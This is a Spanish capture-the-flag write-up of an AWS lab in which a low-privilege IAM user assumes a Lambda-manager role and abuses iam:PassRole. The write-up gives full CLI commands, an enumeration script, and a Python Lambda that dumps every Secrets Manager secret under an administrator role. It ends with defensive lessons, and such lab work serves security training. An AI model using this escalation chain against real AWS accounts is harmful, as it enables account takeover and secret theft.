# Writeup: Assume (HackSmarter — Easy)

Assume es una máquina **Easy** diseñada para simular un entorno AWS con múltiples capas de privilegios. El recorrido comienza con un usuario IAM de bajo privilegio (`chris-lab`) que tiene permisos para listar y obtener información de IAM, así como para asumir un rol (`cg-lambdaManager-role-lab`). Este rol tiene permisos para gestionar funciones Lambda y pasar roles (`lambda:*` y `iam:PassRole`). Al asumir este rol, se obtienen credenciales temporales que permiten enumerar roles adicionales. Entre ellos, se descubre el rol `cg-debug-role-lab`, que tiene la política `AdministratorAccess` adjunta. Aprovechando el permiso `iam:PassRole` del rol `cg-lambdaManager-role-lab`, se crea una función Lambda que utiliza el rol de depuración para acceder a Secrets Manager y recuperar la flag final.

---

## 🎯 Objetivo / Scope

El equipo de Hack Smarter ha sido contratado para realizar una prueba de penetración en AWS. El cliente ha proporcionado credenciales de bajo nivel para un usuario IAM. La principal preocupación es si un atacante con estas credenciales puede elevar sus privilegios y tomar el control total de la cuenta de AWS. Han colocado una bandera en **Secrets Manager**; si se recupera, demuestra un compromiso total.

---

## ⚙️ Fase 1: Configuración inicial de credenciales

Se nos proporcionan unas credenciales de AWS para un usuario IAM. Las configuramos en la CLI de AWS:

```bash
aws configure --profile assume-user
```

**Datos proporcionados:**

- `AWS Access Key ID`: `[REDACTED]`
- `AWS Secret Access Key`: `[REDACTED]`
- `Default region name`: `us-east-1`
- `Default output format`: `json`

Verificamos nuestra identidad:

```bash
aws sts get-caller-identity --profile assume-user
```

```json
{
    "UserId": "AIDA5Y6JLPXSVSJVQ23M3",
    "Account": "946925698533",
    "Arn": "arn:aws:iam::946925698533:user/chris-lab"
}
```

Somos el usuario IAM `chris-lab` en la cuenta `946925698533`. Exportamos el perfil para no tener que especificarlo en cada comando:

```bash
export AWS_PROFILE=assume-user
```

---

## 🔍 Fase 2: Enumeración inicial de IAM

### 2.1 Obtención de información del usuario

Intentamos obtener información sobre el usuario actual:

```bash
aws iam get-user
```

```json
{
    "User": {
        "Path": "/",
        "UserName": "chris-lab",
        "UserId": "AIDA5Y6JLPXSVSJVQ23M3",
        "Arn": "arn:aws:iam::946925698533:user/chris-lab",
        "CreateDate": "2026-08-06T16:59:35+00:00",
        "Tags": [
            {
                "Key": "Name",
                "Value": "cg-chris-lab"
            }
        ]
    }
}
```

El comando `get-user` devuelve información detallada del usuario, incluyendo su ARN, fecha de creación y etiquetas.

### 2.2 Listado de usuarios

Listamos todos los usuarios IAM de la cuenta:

```bash
aws iam list-users
```

```json
{
    "Users": [
        {
            "Path": "/",
            "UserName": "chris-lab",
            "UserId": "AIDA5Y6JLPXSVSJVQ23M3",
            "Arn": "arn:aws:iam::946925698533:user/chris-lab",
            "CreateDate": "2026-08-06T16:59:35+00:00"
        }
    ]
}
```

Solo existe el usuario `chris-lab` en la cuenta.

### 2.3 Políticas adjuntas al usuario

Listamos las políticas gestionadas (managed) adjuntas al usuario:

```bash
aws iam list-attached-user-policies --user-name chris-lab
```

```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "cg-chris-policy-lab",
            "PolicyArn": "arn:aws:iam::946925698533:policy/cg-chris-policy-lab"
        }
    ]
}
```

Listamos las políticas en línea (inline) del usuario:

```bash
aws iam list-user-policies --user-name chris-lab
```

```json
{
    "PolicyNames": []
}
```

El usuario `chris-lab` tiene una política gestionada llamada `cg-chris-policy-lab` y no tiene políticas en línea.

### 2.4 Obtención de la política del usuario

Obtenemos el documento de la política adjunta al usuario para entender sus permisos. Primero, obtenemos la versión por defecto de la política:

```bash
POLICY_ARN="arn:aws:iam::946925698533:policy/cg-chris-policy-lab"
aws iam get-policy --policy-arn "$POLICY_ARN"
```

```json
{
    "Policy": {
        "PolicyName": "cg-chris-policy-lab",
        "PolicyId": "ANPA5Y6JLPXS72XSCJBMW",
        "Arn": "arn:aws:iam::946925698533:policy/cg-chris-policy-lab",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "cg-chris-policy-lab",
        "CreateDate": "2026-08-06T16:59:35+00:00",
        "UpdateDate": "2026-08-06T16:59:35+00:00",
        "Tags": [
            {
                "Key": "Name",
                "Value": "cg-chris-policy-lab"
            }
        ]
    }
}
```

Luego, obtenemos la versión `v1` de la política para ver su contenido:

```bash
aws iam get-policy-version --policy-arn "$POLICY_ARN" --version-id v1
```

```json
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "sts:AssumeRole",
                        "iam:List*",
                        "iam:Get*"
                    ],
                    "Effect": "Allow",
                    "Resource": "*",
                    "Sid": "chris"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2026-08-06T16:59:35+00:00"
    }
}
```

**Análisis de la política:** El usuario `chris-lab` tiene permisos para:

- `sts:AssumeRole`: Asumir roles IAM.
- `iam:List*`: Listar recursos de IAM (usuarios, roles, políticas, etc.).
- `iam:Get*`: Obtener información detallada de recursos de IAM.

Estos permisos permiten enumerar el entorno de IAM y asumir roles, lo que es clave para la escalada de privilegios.

---

## 🔑 Fase 3: Enumeración de roles y asunción

### 3.1 Listado de roles

Listamos todos los roles IAM de la cuenta:

```bash
aws iam list-roles
```

**Resultado relevante (extracto):**

```json
{
    "Roles": [
        {
            "Path": "/",
            "RoleName": "cg-lambdaManager-role-lab",
            "RoleId": "AROA5Y6JLPXS4AIHI2VWA",
            "Arn": "arn:aws:iam::946925698533:role/cg-lambdaManager-role-lab",
            "CreateDate": "2026-08-06T16:59:51+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "arn:aws:iam::946925698533:user/chris-lab"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            }
        }
    ]
}
```

El rol `cg-lambdaManager-role-lab` tiene una política de confianza (*trust policy*) que permite a `chris-lab` asumirlo. Esto es exactamente lo que necesitamos, ya que `chris-lab` tiene permiso `sts:AssumeRole` por su política.

### 3.2 Asunción del rol

Asumimos el rol `cg-lambdaManager-role-lab` para obtener credenciales temporales:

```bash
aws sts assume-role --role-arn arn:aws:iam::946925698533:role/cg-lambdaManager-role-lab --role-session-name chris-session
```

```json
{
    "Credentials": {
        "AccessKeyId": "[REDACTED]",
        "SecretAccessKey": "[REDACTED]",
        "SessionToken": "[REDACTED]",
        "Expiration": "2026-08-06T19:44:23+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA5Y6JLPXS4AIHI2VWA:chris-session",
        "Arn": "arn:aws:sts::946925698533:assumed-role/cg-lambdaManager-role-lab/chris-session"
    }
}
```

### 3.3 Configuración del perfil con credenciales temporales

Creamos un nuevo perfil de AWS con las credenciales temporales obtenidas:

```bash
aws configure --profile chris-session
```

- `AWS Access Key ID`: `[REDACTED]`
- `AWS Secret Access Key`: `[REDACTED]`
- `AWS Session Token`: `[REDACTED]`
- `Default region name`: `us-east-1`
- `Default output format`: `json`

Verificamos la identidad con el nuevo perfil:

```bash
export AWS_PROFILE=chris-session
aws sts get-caller-identity
```

```json
{
    "UserId": "AROA5Y6JLPXS4AIHI2VWA:chris-session",
    "Account": "946925698533",
    "Arn": "arn:aws:sts::946925698533:assumed-role/cg-lambdaManager-role-lab/chris-session"
}
```

Ahora estamos asumiendo el rol `cg-lambdaManager-role-lab`.

---

## 🧩 Fase 4: Enumeración de permisos del rol asumido

### 4.1 Políticas del rol asumido

Listamos las políticas gestionadas adjuntas al rol:

```bash
aws iam list-attached-role-policies --role-name cg-lambdaManager-role-lab
```

```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "cg-lambdaManager-policy-lab",
            "PolicyArn": "arn:aws:iam::946925698533:policy/cg-lambdaManager-policy-lab"
        }
    ]
}
```

Listamos las políticas en línea del rol:

```bash
aws iam list-role-policies --role-name cg-lambdaManager-role-lab
```

```json
{
    "PolicyNames": []
}
```

### 4.2 Obtención de la política del rol

Obtenemos el documento de la política adjunta al rol:

```bash
POLICY_ARN="arn:aws:iam::946925698533:policy/cg-lambdaManager-policy-lab"
aws iam get-policy --policy-arn "$POLICY_ARN"
```

```json
{
    "Policy": {
        "PolicyName": "cg-lambdaManager-policy-lab",
        "PolicyId": "ANPA5Y6JLPXS7LKRBZB7F",
        "Arn": "arn:aws:iam::946925698533:policy/cg-lambdaManager-policy-lab",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "cg-lambdaManager-policy-lab",
        "CreateDate": "2026-08-06T16:59:35+00:00",
        "UpdateDate": "2026-08-06T16:59:35+00:00",
        "Tags": [
            {
                "Key": "Name",
                "Value": "cg-lambdaManager-policy-lab"
            }
        ]
    }
}
```

Obtenemos la versión `v1` de la política:

```bash
aws iam get-policy-version --policy-arn "$POLICY_ARN" --version-id v1
```

```json
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "lambda:*",
                        "iam:PassRole"
                    ],
                    "Effect": "Allow",
                    "Resource": "*",
                    "Sid": "lambdaManager"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2026-08-06T16:59:35+00:00"
    }
}
```

**Análisis de la política:** El rol `cg-lambdaManager-role-lab` tiene permisos para:

- `lambda:*`: Todas las acciones sobre AWS Lambda (crear, ejecutar, modificar funciones, etc.).
- `iam:PassRole`: Pasar un rol a un servicio de AWS (en este caso, a Lambda). Esto es crítico, ya que permite asignar un rol con permisos elevados a una función Lambda.

### 4.3 Enumeración de roles adicionales

Para encontrar más roles y posibles vectores de escalada, utilizamos un script de enumeración que listará todos los roles y sus políticas adjuntas.

**Script `enum_iam.sh`:**

```bash
#!/bin/bash

# Perfil con permisos de lectura (iam:List*, iam:Get*)
PROFILE="assume-user"

echo -e "\n[+] Iniciando enumeración de IAM con el perfil: $PROFILE\n"

# 1. Listar todos los roles, excluyendo los service-linked roles (AWSServiceRoleFor*)
ROLES=$(aws iam list-roles --profile "$PROFILE" \
        --query 'Roles[?starts_with(RoleName, `AWSServiceRoleFor`) == `false`].RoleName' \
        --output text)

if [ -z "$ROLES" ]; then
    echo "[-] No se encontraron roles personalizados."
    exit 1
fi

# 2. Iterar sobre cada rol
for ROLE in $ROLES; do
    echo -e "======================================================"
    echo -e "[+] ANALIZANDO ROL: $ROLE"
    echo -e "======================================================"
    
    # 2.1 Enumerar Políticas Inline
    INLINE_POLICIES=$(aws iam list-role-policies --role-name "$ROLE" --profile "$PROFILE" --output text 2>/dev/null)
    
    if [ -n "$INLINE_POLICIES" ]; then
        echo -e "\n  --- Políticas Inline ---"
        for POLICY in $INLINE_POLICIES; do
            echo -e "\n  [*] Inline Policy: $POLICY"
            echo -e "  -----------------------------------"
            aws iam get-role-policy --role-name "$ROLE" --policy-name "$POLICY" --profile "$PROFILE" \
                --query 'PolicyDocument' --output json 2>/dev/null | jq '.'
        done
    fi

    # 2.2 Enumerar Políticas Managed (Adjuntas)
    ATTACHED_POLICIES=$(aws iam list-attached-role-policies --role-name "$ROLE" --profile "$PROFILE" \
                        --query 'AttachedPolicies[].PolicyArn' --output text 2>/dev/null)
    
    if [ -n "$ATTACHED_POLICIES" ]; then
        echo -e "\n  --- Políticas Managed Adjuntas ---"
        for ARN in $ATTACHED_POLICIES; do
            POLICY_NAME=$(echo "$ARN" | rev | cut -d'/' -f1 | rev)
            echo -e "\n  [*] Managed Policy: $POLICY_NAME"
            echo -e "  -----------------------------------"
            
            # Obtener la versión por defecto de la política
            VERSION_ID=$(aws iam get-policy --policy-arn "$ARN" --profile "$PROFILE" \
                         --query 'Policy.DefaultVersionId' --output text 2>/dev/null)
            
            # Obtener e imprimir el documento de la política
            if [ -n "$VERSION_ID" ]; then
                aws iam get-policy-version --policy-arn "$ARN" --version-id "$VERSION_ID" --profile "$PROFILE" \
                    --query 'PolicyVersion.Document' --output json 2>/dev/null | jq '.'
            else
                echo "      (No se pudo obtener la versión de la política)"
            fi
        done
    fi
    
    echo ""
done

echo -e "\n[+] Enumeración finalizada."
```

**Ejecución del script:**

```bash
./enum_iam.sh
```

**Resultado relevante:**

```
======================================================
[+] ANALIZANDO ROL: cg-debug-role-lab
======================================================

  --- Políticas Managed Adjuntas ---

  [*] Managed Policy: AdministratorAccess
  -----------------------------------
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
```

Encontramos el rol `cg-debug-role-lab` con la política `AdministratorAccess` adjunta. Este rol tiene permisos de administrador en toda la cuenta de AWS.

---

## 🚀 Fase 5: Explotación mediante Lambda

### 5.1 Estrategia

El rol `cg-lambdaManager-role-lab` tiene permisos `iam:PassRole` y `lambda:*`. Esto significa que podemos crear una función Lambda y asignarle el rol `cg-debug-role-lab` (que tiene permisos de administrador). Cuando la función se ejecute, tendrá los permisos del rol de administrador. De esta manera, podemos escalar privilegios y acceder a Secrets Manager para recuperar la flag.

### 5.2 Creación de la función Lambda

Creamos un archivo `lambda_function.py` con el siguiente código:

```python
import boto3
import json

def lambda_handler(event, context):
    # Inicializa el cliente de Secrets Manager
    sm = boto3.client('secretsmanager', region_name='us-east-1')
    out = {}
    
    try:
        # Lista todos los secretos
        secrets = sm.list_secrets()
        for s in secrets.get('SecretList', []):
            name = s['Name']
            try:
                # Obtiene el valor del secreto
                r = sm.get_secret_value(SecretId=name)
                out[name] = r.get('SecretString', '<binary>')
            except Exception as e:
                out[name] = f"ERR: {e}"
    except Exception as e:
        out['error'] = str(e)
        
    return {
        'statusCode': 200,
        'body': json.dumps(out)
    }
```

**Explicación del código:**

- Importamos `boto3` para interactuar con los servicios de AWS.
- Creamos un cliente de Secrets Manager en la región `us-east-1`.
- Listamos todos los secretos con `list_secrets()`.
- Para cada secreto, obtenemos su valor con `get_secret_value()`.
- Devolvemos un diccionario con los nombres y valores de los secretos.

Empaquetamos la función en un archivo ZIP:

```bash
zip function.zip lambda_function.py
```

### 5.3 Creación de la función Lambda

Creamos la función Lambda con el rol `cg-debug-role-lab`:

```bash
aws lambda create-function \
  --function-name cg-get-secrets \
  --runtime python3.11 \
  --role arn:aws:iam::946925698533:role/cg-debug-role-lab \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://function.zip \
  --timeout 30 \
  --profile chris-session \
  --region us-east-1
```

**Explicación de parámetros:**

- `--function-name`: Nombre de la función Lambda.
- `--runtime`: Versión de Python utilizada.
- `--role`: ARN del rol que la función asumirá (`cg-debug-role-lab`, que tiene permisos de administrador).
- `--handler`: Punto de entrada de la función (`lambda_function.lambda_handler`).
- `--zip-file`: Archivo ZIP con el código.
- `--timeout`: Tiempo máximo de ejecución (30 segundos).
- `--profile`: Perfil de AWS con credenciales del rol `cg-lambdaManager-role-lab`.
- `--region`: Región de AWS.

### 5.4 Invocación de la función Lambda

Invocamos la función Lambda para que se ejecute y recupere los secretos:

```bash
aws lambda invoke --function-name cg-get-secrets --profile chris-session --cli-binary-format raw-in-base64-out --payload '{}' response.json
```

```json
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
```

### 5.5 Obtención de la flag

Leemos la respuesta de la función Lambda:

```bash
cat response.json | jq
```

```json
{
  "statusCode": 200,
  "body": "{\"cg-flag-lab\": \"HSM{l4mbd4_pr1v3sc_4dm1n_v1ct0ry}\"}"
}
```

**Flag final:** `HSM{l4mbd4_pr1v3sc_4dm1n_v1ct0ry}`

Hemos completado el objetivo y recuperado la flag del Secrets Manager.

---

## 📌 Conclusión

Assume es una máquina **Easy** que combina:

1. **Configuración inicial** de credenciales AWS.
2. **Enumeración de IAM** para descubrir permisos y políticas.
3. **Asunción de roles** mediante `sts:AssumeRole` para obtener credenciales temporales.
4. **Enumeración de permisos** del rol asumido para identificar acciones permitidas (`lambda:*` e `iam:PassRole`).
5. **Enumeración de roles adicionales** para encontrar un rol con `AdministratorAccess`.
6. **Creación de una función Lambda** que utiliza el rol de administrador mediante `iam:PassRole`.
7. **Invocación de la función Lambda** para acceder a Secrets Manager y recuperar la flag.

---

## 📚 Lecciones aprendidas


**1. La enumeración de IAM puede revelar rutas de escalada**

Los permisos `iam:List*` e `iam:Get*` permitieron identificar roles, políticas y relaciones de confianza. En este caso, facilitaron descubrir que `chris-lab` podía asumir `cg-lambdaManager-role-lab`.

**2. `sts:AssumeRole` depende de dos políticas**

Para asumir un rol deben coincidir el permiso `sts:AssumeRole` de la identidad solicitante y la política de confianza del rol. Ambas condiciones se cumplieron en el laboratorio. [aws.amazon](https://aws.amazon.com/blogs/security/how-to-use-trust-policies-with-iam-roles/)

**3. `iam:PassRole` es peligroso junto con Lambda**

La combinación de:

```text
iam:PassRole
lambda:CreateFunction
lambda:InvokeFunction
```

permitió pasar `cg-debug-role-lab` a una función Lambda y ejecutar código con sus permisos. `iam:PassRole` no asume el rol directamente; permite que un servicio lo utilice. [aws.amazon](https://aws.amazon.com/blogs/security/how-to-use-the-passrole-permission-with-iam-roles/)

**4. `iam:PassRole` debe limitarse**

El permiso estaba configurado con `Resource: "*"`, lo que permitía pasar cualquier rol. Debe restringirse a ARN específicos y, cuando sea posible, al servicio autorizado mediante `iam:PassedToService`.

**5. Los roles administrativos deben protegerse**

`cg-debug-role-lab` tenía `AdministratorAccess` y fue utilizado como execution role de Lambda. Los roles administrativos no deberían emplearse como roles genéricos ni estar disponibles para identidades de menor privilegio.

**6. La separación de roles no era suficiente**

Aunque existían roles separados para el usuario, Lambda y la administración, `iam:PassRole` junto con `lambda:*` anuló esa separación. La segregación debe combinarse con least privilege y controles estrictos sobre la delegación de roles.

**7. La automatización mejoró la cobertura**

El script permitió revisar sistemáticamente los roles y descubrir el rol administrativo. Aun así, una auditoría completa también debe revisar políticas inline, grupos, trust policies, boundaries, SCP y condiciones. IAM Access Analyzer puede ayudar a detectar permisos excesivos o no utilizados. [aws.amazon](https://aws.amazon.com/iam/access-analyzer/)

**8. Impacto confirmado**

La recuperación de `cg-flag-lab` demostró una escalada completa:

```text
chris-lab
→ AssumeRole
→ cg-lambdaManager-role-lab
→ PassRole
→ Lambda
→ cg-debug-role-lab
→ AdministratorAccess
→ Secrets Manager
```
